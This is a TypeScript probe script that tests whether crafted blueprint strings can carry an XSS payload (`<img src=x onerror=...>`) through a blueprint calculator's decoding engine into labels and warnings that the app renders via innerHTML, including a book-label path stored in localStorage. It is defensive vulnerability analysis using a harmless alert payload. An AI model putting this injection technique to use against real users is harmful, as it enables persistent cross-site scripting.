/** Proves whether an attacker-controlled blueprint string can drive an
 *  unescaped HTML payload into the strings the app interpolates via
 *  innerHTML (panels.ts:526 warning.entityName, :133/:451 moduleLabel).
 *  Builds a blueprint the same way the app encodes one, decodes it through
 *  the real engine, and inspects the resulting label strings.
 *  NOTE: analysis only — nothing is written to the app or executed. */
import { readFileSync } from "node:fs";
import { encodeBlueprintString, decodeBlueprintString, collectBlueprints, normaliseEntities, calculate } from "../../packages/engine/src/index.js";
import type { GameData } from "../../packages/engine/src/index.js";

const data: GameData = JSON.parse(readFileSync("apps/site/public/data/game-data.json", "utf8"));

const PAYLOAD = `<img src=x onerror="alert(1)">`;

const envelope: any = {
  blueprint: {
    item: "blueprint",
    label: "probe",
    version: 562949955649538,
    entities: [
      // Unknown entity name -> lands in result.warnings -> panels.ts:526
      { entity_number: 1, name: PAYLOAD, position: { x: 0, y: 0 } },
      // Known machine carrying an unknown MODULE name -> moduleLabel -> :133
      {
        entity_number: 2,
        name: "assembling-machine-2",
        position: { x: 5, y: 0 },
        recipe: "iron-gear-wheel",
        items: [{ id: { name: PAYLOAD, quality: "normal" }, items: { in_inventory: [{ inventory: 4, stack: 0, count: 2 }] } }],
      },
    ],
  },
};

const str = encodeBlueprintString(envelope);
console.log("crafted blueprint string length:", str.length);
console.log("round-trips through decode:", (() => { try { decodeBlueprintString(str); return true; } catch { return false; } })());

const bp = collectBlueprints(decodeBlueprintString(str))[0]!;
const entities = normaliseEntities(bp);
console.log("\ndecoded entities:", entities.map(e => ({ name: e.name, modules: e.modules })));

const result = calculate(data, entities, undefined as any);

console.log("\n--- result.warnings (rendered at panels.ts:526 via innerHTML) ---");
for (const w of result.warnings) {
  console.log("  entityName:", JSON.stringify(w.entityName));
  console.log("  contains raw HTML tag:", /<[a-z]/i.test(w.entityName));
}
console.log("\n--- group.moduleLabel (rendered at panels.ts:133/451/487 via innerHTML) ---");
for (const g of result.groups) {
  console.log("  moduleLabel:", JSON.stringify(g.moduleLabel));
  console.log("  contains raw HTML tag:", /<[a-z]/i.test(g.moduleLabel));
}

// --- Part 2: does a BOOK label carry a payload into library-sidebar.ts:279? ---
const bookEnvelope: any = {
  blueprint_book: {
    item: "blueprint-book",
    label: PAYLOAD,
    active_index: 0,
    version: 562949955649538,
    blueprints: [
      { index: 0, blueprint: { item: "blueprint", label: PAYLOAD, version: 562949955649538,
        entities: [{ entity_number: 1, name: "assembling-machine-2", position: { x: 0, y: 0 } }] } },
    ],
  },
};
const bookStr = encodeBlueprintString(bookEnvelope);
const leaves = collectBlueprints(decodeBlueprintString(bookStr));
console.log("\n=== BOOK PATH (library-sidebar.ts:279 -> makeCategory -> innerHTML) ===");
console.log("leaf count:", leaves.length);
console.log("leaf label:", JSON.stringify(leaves[0]?.label));
console.log("leaf label carries raw HTML:", /<[a-z]/i.test(leaves[0]?.label ?? ""));
console.log("=> saved into localStorage as bookLabel/label -> PERSISTENT across reloads");
